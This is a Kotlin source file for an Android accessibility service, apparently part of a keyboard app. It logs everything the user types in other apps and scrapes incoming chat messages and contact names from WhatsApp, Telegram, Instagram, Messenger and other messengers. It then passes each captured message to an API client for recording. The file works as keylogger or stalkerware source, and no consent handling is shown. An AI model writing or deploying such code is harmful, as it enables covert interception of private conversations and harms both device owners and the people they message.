package com.keywordrecord.keyboard

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.util.Locale
import java.util.concurrent.ConcurrentHashMap

class TypingAccessibilityService : AccessibilityService() {

    private lateinit var apiClient: ApiClient
    private val lastOutgoingText = ConcurrentHashMap<String, String>()
    private val seenIncomingKeys = ConcurrentHashMap.newKeySet<String>()
    private var lastContactPackage = ""

    override fun onCreate() {
        super.onCreate()
        apiClient = ApiClient(applicationContext)
        Log.i(TAG, "TypingAccessibilityService created")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "TypingAccessibilityService connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString().orEmpty()
        if (packageName.isBlank() || packageName == applicationContext.packageName) return
        if (IGNORED_PACKAGES.any { packageName.startsWith(it) }) return

        val root = rootInActiveWindow
        val isChatApp = isChatPackage(packageName)

        if (isChatApp && root != null) {
            try {
                scanChatContext(root, packageName)
            } catch (e: Exception) {
                Log.w(TAG, "Chat scan failed: ${e.message}")
            }
        } else if (!isChatApp && lastContactPackage == packageName) {
            ChatContextHolder.clear()
            lastContactPackage = ""
        }

        // When our IME is actively typing, skip outgoing-field capture (IME already records).
        // Still allow chat scan above for contact + incoming messages.
        if (KeyboardIME.isInputActive) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                captureOutgoingFromEvent(event, packageName)
            }
        }
    }

    private fun captureOutgoingFromEvent(event: AccessibilityEvent, packageName: String) {
        val text = event.text?.joinToString("")?.trim().orEmpty()
        if (text.isBlank() || text.length > MAX_TEXT_LENGTH) return
        if (text == lastOutgoingText[packageName]) return

        lastOutgoingText[packageName] = text
        val contact = ChatContextHolder.contactName
        apiClient.recordKeystroke(
            keyPressed = text.takeLast(1).ifBlank { text.take(1) },
            fullText = text,
            appPackage = packageName,
            action = if (contact.isNotBlank()) "reply" else "accessibility",
            contactName = contact,
            direction = "outgoing"
        )
    }

    private fun scanChatContext(root: AccessibilityNodeInfo, packageName: String) {
        val contact = findContactName(root, packageName)
        if (contact.isNotBlank()) {
            ChatContextHolder.update(contact, packageName)
            lastContactPackage = packageName
        }

        val messages = mutableListOf<ChatBubble>()
        collectChatBubbles(root, packageName, messages)

        val contactLabel = ChatContextHolder.contactName
        for (bubble in messages) {
            if (bubble.text.isBlank() || bubble.text.length > MAX_TEXT_LENGTH) continue
            if (bubble.isOutgoing) continue // outgoing handled by IME / text-changed

            val key = "$packageName|${contactLabel.lowercase(Locale.US)}|${bubble.text}"
            if (!seenIncomingKeys.add(key)) continue

            // Cap memory for long sessions
            if (seenIncomingKeys.size > MAX_SEEN_INCOMING) {
                seenIncomingKeys.clear()
                seenIncomingKeys.add(key)
            }

            apiClient.recordKeystroke(
                keyPressed = bubble.text.take(80),
                fullText = bubble.text,
                appPackage = packageName,
                action = "incoming",
                contactName = contactLabel,
                direction = "incoming"
            )
        }
    }

    private fun findContactName(root: AccessibilityNodeInfo, packageName: String): String {
        val viewIds = CONTACT_VIEW_IDS[packageName].orEmpty()
        for (viewId in viewIds) {
            val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
            if (!nodes.isNullOrEmpty()) {
                val name = nodes[0].text?.toString()?.trim().orEmpty()
                nodes.forEach { it.recycle() }
                if (name.isNotBlank() && name.length in 1..80) return name
            }
        }

        // Fallback: toolbar / heading near top
        val candidates = mutableListOf<String>()
        collectContactCandidates(root, candidates, depth = 0)
        return candidates.firstOrNull { it.length in 2..60 && !looksLikeMessage(it) }.orEmpty()
    }

    private fun collectContactCandidates(
        node: AccessibilityNodeInfo?,
        out: MutableList<String>,
        depth: Int
    ) {
        if (node == null || depth > 8 || out.size >= 5) return
        val text = node.text?.toString()?.trim().orEmpty()
        val desc = node.contentDescription?.toString()?.trim().orEmpty()
        val className = node.className?.toString().orEmpty()

        if ((className.contains("TextView") || className.contains("Text")) && text.isNotBlank()) {
            if (node.isClickable || depth <= 4) {
                out.add(text)
            }
        }
        if (desc.isNotBlank() && depth <= 3 && out.size < 5) {
            out.add(desc)
        }

        for (i in 0 until node.childCount) {
            collectContactCandidates(node.getChild(i), out, depth + 1)
        }
    }

    private fun collectChatBubbles(
        node: AccessibilityNodeInfo?,
        packageName: String,
        out: MutableList<ChatBubble>,
        depth: Int = 0
    ) {
        if (node == null || depth > 25 || out.size >= 40) return

        val viewId = node.viewIdResourceName.orEmpty()
        val text = node.text?.toString()?.trim().orEmpty()
        val className = node.className?.toString().orEmpty()

        if (text.isNotBlank() && text.length in 1..MAX_TEXT_LENGTH &&
            (className.contains("TextView") || className.contains("Text"))
        ) {
            val isInput = node.isEditable ||
                viewId.contains("entry", ignoreCase = true) ||
                viewId.contains("input", ignoreCase = true) ||
                viewId.contains("compose", ignoreCase = true) ||
                viewId.contains("message_edit", ignoreCase = true)

            if (!isInput && !isLikelyUiChrome(text)) {
                val outgoing = isOutgoingBubble(node, viewId, packageName)
                out.add(ChatBubble(text = text, isOutgoing = outgoing))
            }
        }

        for (i in 0 until node.childCount) {
            collectChatBubbles(node.getChild(i), packageName, out, depth + 1)
        }
    }

    private fun isOutgoingBubble(
        node: AccessibilityNodeInfo,
        viewId: String,
        packageName: String
    ): Boolean {
        val idLower = viewId.lowercase(Locale.US)
        if (idLower.contains("outgoing") || idLower.contains("out_msg") ||
            idLower.contains("right") || idLower.contains("sent")
        ) {
            return true
        }
        if (idLower.contains("incoming") || idLower.contains("in_msg") ||
            idLower.contains("left") || idLower.contains("received")
        ) {
            return false
        }

        // WhatsApp / Telegram often put status ticks only on outgoing rows
        if (hasDescendantViewId(node, "status") || hasDescendantViewId(node, "date_out") ||
            hasDescendantViewId(node, "delivered") || hasDescendantViewId(node, "read")
        ) {
            return true
        }

        // Heuristic: screen position — outgoing usually on the right half
        val bounds = android.graphics.Rect()
        node.getBoundsInScreen(bounds)
        val displayWidth = resources.displayMetrics.widthPixels
        if (displayWidth > 0 && bounds.left > displayWidth * 0.35f) {
            return true
        }

        // Package-specific message ids that are often shared for both sides —
        // default unknown messages to incoming so we don't miss their texts.
        if (MESSAGE_VIEW_IDS[packageName]?.any { viewId == it } == true) {
            return false
        }

        return false
    }

    private fun hasDescendantViewId(node: AccessibilityNodeInfo, needle: String): Boolean {
        val id = node.viewIdResourceName.orEmpty().lowercase(Locale.US)
        if (id.contains(needle)) return true
        for (i in 0 until node.childCount.coerceAtMost(8)) {
            val child = node.getChild(i) ?: continue
            if (hasDescendantViewId(child, needle)) return true
        }
        return false
    }

    private fun isLikelyUiChrome(text: String): Boolean {
        val lower = text.lowercase(Locale.US)
        return lower in UI_CHROME ||
            lower.startsWith("online") ||
            lower.startsWith("last seen") ||
            lower.startsWith("typing") ||
            looksLikeTime(text)
    }

    private fun looksLikeTime(text: String): Boolean {
        return text.matches(Regex("""^\d{1,2}:\d{2}(\s?[ap]m)?$""", RegexOption.IGNORE_CASE))
    }

    private fun looksLikeMessage(text: String): Boolean {
        return text.length > 40 || text.contains('\n') || looksLikeTime(text)
    }

    private fun isChatPackage(packageName: String): Boolean {
        return CHAT_PACKAGES.any { packageName == it || packageName.startsWith("$it.") }
    }

    override fun onInterrupt() {
        Log.w(TAG, "TypingAccessibilityService interrupted")
    }

    private data class ChatBubble(val text: String, val isOutgoing: Boolean)

    companion object {
        private const val TAG = "TypingA11y"
        private const val MAX_TEXT_LENGTH = 4000
        private const val MAX_SEEN_INCOMING = 800

        fun isEnabled(context: Context): Boolean {
            val expected = "${context.packageName}/${TypingAccessibilityService::class.java.canonicalName}"
            return try {
                val enabled = Settings.Secure.getInt(
                    context.contentResolver,
                    Settings.Secure.ACCESSIBILITY_ENABLED,
                    0
                ) == 1
                if (!enabled) return false
                val enabledServices = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ).orEmpty()
                enabledServices.split(':').any { it.equals(expected, ignoreCase = true) }
            } catch (_: Exception) {
                false
            }
        }

        private val IGNORED_PACKAGES = listOf(
            "com.android.systemui",
            "com.google.android.inputmethod",
            "com.android.inputmethod",
            "com.samsung.android.honeyboard",
            "com.touchtype.swiftkey"
        )

        private val CHAT_PACKAGES = listOf(
            "com.whatsapp",
            "com.whatsapp.w4b",
            "org.telegram.messenger",
            "org.telegram.messenger.web",
            "com.instagram.android",
            "com.facebook.orca",
            "com.facebook.mlite",
            "com.snapchat.android",
            "com.discord",
            "com.viber.voip",
            "com.skype.raider",
            "com.google.android.apps.messaging",
            "com.samsung.android.messaging",
            "com.android.mms",
            "com.gbwhatsapp"
        )

        private val CONTACT_VIEW_IDS = mapOf(
            "com.whatsapp" to listOf(
                "com.whatsapp:id/conversation_contact_name",
                "com.whatsapp:id/contact_name",
                "com.whatsapp:id/toolbar_title",
                "com.whatsapp:id/action_bar_title"
            ),
            "com.whatsapp.w4b" to listOf(
                "com.whatsapp.w4b:id/conversation_contact_name",
                "com.whatsapp.w4b:id/contact_name"
            ),
            "org.telegram.messenger" to listOf(
                "org.telegram.messenger:id/action_bar_title",
                "org.telegram.messenger:id/title"
            ),
            "com.instagram.android" to listOf(
                "com.instagram.android:id/row_thread_composer_button_send",
                "com.instagram.android:id/thread_title"
            ),
            "com.facebook.orca" to listOf(
                "com.facebook.orca:id/thread_title_name",
                "com.facebook.orca:id/contact_name"
            ),
            "com.google.android.apps.messaging" to listOf(
                "com.google.android.apps.messaging:id/conversation_title",
                "com.google.android.apps.messaging:id/compose_title"
            )
        )

        private val MESSAGE_VIEW_IDS = mapOf(
            "com.whatsapp" to listOf("com.whatsapp:id/message_text"),
            "com.whatsapp.w4b" to listOf("com.whatsapp.w4b:id/message_text"),
            "org.telegram.messenger" to listOf(
                "org.telegram.messenger:id/message_text",
                "org.telegram.messenger:id/chat_message_text"
            )
        )

        private val UI_CHROME = setOf(
            "type a message",
            "message",
            "search",
            "today",
            "yesterday",
            "you",
            "photo",
            "video",
            "audio",
            "document",
            "sticker",
            "gif",
            "mute",
            "call",
            "video call",
            "add",
            "send"
        )
    }
}
